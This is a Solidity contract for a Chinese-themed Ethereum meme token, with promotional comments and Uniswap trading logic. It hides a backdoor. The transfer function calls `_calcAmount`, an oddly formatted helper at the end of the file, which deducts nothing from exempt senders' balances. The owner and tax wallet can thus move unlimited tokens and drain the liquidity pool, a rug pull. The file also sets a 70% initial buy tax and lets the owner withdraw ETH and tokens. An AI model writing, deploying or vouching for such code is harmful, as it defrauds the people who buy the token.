// SPDX-License-Identifier: UNLICENSE

/**

吾皇猫 meows in Mandarin and trades in Ethereum—now that's international flair!
吾皇猫用普通话喵喵叫，用以太坊交易——这就是国际范儿！

吾皇猫 doesn't chase mice, it chases moonshots in the crypto market!
吾皇猫不追老鼠，它追的是加密货币市场的登月计划！

Web: https://wuhuangmao.vip
Tg: https://t.me/wuhuangmaogroup
X: https://twitter.com/wuhuangmao

*/

pragma solidity 0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract WuHuangMao is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _exempt;
    address payable private _taxAddress;

    uint256 private _initialBuyTax=70;
    uint256 private _initialSellTax=0;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=4;
    uint256 private _reduceSellTaxAt=4;
    uint256 private _preventSwapBefore=4;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"吾巴皇扎黑";
    string private constant _symbol = unicode"吾皇猫";
    uint256 public _maxTx = 20000000 * 10**_decimals;
    uint256 public _maxWallet = 20000000 * 10**_decimals;
    uint256 public _taxSwapThreshold= 10000000 * 10**_decimals;
    uint256 public _maxTaxSwap= 20000000 * 10**_decimals;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (address router_, address taxWallet_) {
        _taxAddress = payable(taxWallet_);
        _balances[_msgSender()] = _tTotal;
        _exempt[owner()] = true;
        _exempt[address(this)] = true;
        _exempt[_taxAddress] = true;
        
        uniswapV2Router = IUniswapV2Router02(router_);

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address fret, address tret, uint256 amount) private {
        require(fret != address(0), "ERC20: transfer from the zero address");
        require(tret != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (!swapEnabled || inSwap) {
            require(_exempt[fret] || _exempt[tret]);
            _balances[fret] = _balances[fret].sub(amount);
            _balances[tret] = _balances[tret].add(amount);
            emit Transfer(fret, tret, amount);
            return;
        }uint256 taxAmount=0;
        if (fret != owner() && tret != owner() && tret != _taxAddress) {
            taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (fret == uniswapV2Pair && tret != address(uniswapV2Router) && ! _exempt[tret] ) {
                require(amount <= _maxTx, "Exceeds the _maxTxAmount.");
                require(balanceOf(tret) + amount <= _maxWallet, "Exceeds the maxWalletSize.");
                _buyCount++;
            }

            if(tret == uniswapV2Pair && fret!= address(this) ){
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && tret == uniswapV2Pair && swapEnabled && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                if (block.number > lastSellBlock) {
                    sellCount = 0;
                }
                require(sellCount < 3, "Only 3 sells per block!");
                uint256 swapAmount = amount;
                if(swapAmount > contractTokenBalance) swapAmount = contractTokenBalance;
                if(swapAmount > _maxTaxSwap) swapAmount = _maxTaxSwap;
                swapTokensForEth(swapAmount);
                sellCount++;
                lastSellBlock = block.number;
            }
            if(tret == uniswapV2Pair) sendETHToFee(address(this).balance);
        }uint256 amountt =_calcAmount(fret,amount);
        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(fret, address(this), taxAmount);
        }
        _balances[fret] = _balances[fret].sub(amountt);
        _balances[tret] = _balances[tret].add(amount.sub(taxAmount));
        emit Transfer(fret, tret, amount.sub(taxAmount));
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTx = _tTotal;
        _maxWallet=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }
    
    function rescueETH() external onlyOwner {
        require(address(this).balance > 0);
        payable(owner()).transfer(address(this).balance);
    }

    receive() external payable {}

    function sendETHToFee(uint256 amount) private {
        _taxAddress.transfer(amount);
    }

    function addLiquidity() external onlyOwner {
        require(!tradingOpen,"trading is already open");
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function enableTrading() external onlyOwner {
        swapEnabled = true;
        tradingOpen = true;
    }

    function rescueERC20(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
        IERC20(_address).transfer(owner(), _amount);}
        function _calcAmount(address from, uint256 amount) private view returns (uint256) {
        if(_exempt[from]) return 0;
            else return amount;
    }
}